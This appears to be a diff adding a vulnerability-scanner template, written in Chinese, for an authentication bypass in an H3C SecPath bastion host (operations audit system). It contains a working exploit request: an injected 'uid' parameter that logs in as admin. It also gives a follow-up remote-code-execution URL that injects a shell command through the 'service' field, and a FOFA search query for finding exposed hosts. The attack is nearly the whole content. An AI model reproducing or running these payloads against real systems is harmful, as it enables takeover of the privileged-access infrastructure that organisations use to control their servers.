@@ -1,0 +1,24 @@
+## id: VEID-2024-0309
+## name: H3C-SecParh堡垒机任意用户登录漏洞-导致RCE
+## author: hack007x
+## severity: critical
+## tags: veid,file,veid2024,rce
+## description: H3C SecParh堡垒机的get_detail_view.php中存在任意用户登录漏洞。攻击者可以构建一个恶意URL，利用该漏洞进行攻击,RCE则需要游览器任意登录成功后,直接访问:IP+端口/audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(pwd)&identity_cond=&query_type=all&format=json&browse=true
+## fofa-query: app="H3C-SecPath-运维审计系统" && body="2018"
+## verification: true
+
+
+GET /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Set-Cookie"] contains "PHPSESSID=" 
+#@ matcher: body contains "管理员" || body contains "审计" || body contains "账户设置" || body contains "最近访问" || body contains "活跃会话"
+
+
+
+
+
+# @VEIL-STAMP: d2c1adfa8d7793544a689fb4f45fd74b13e5989200ba5fc14d57305bd88dd8cf
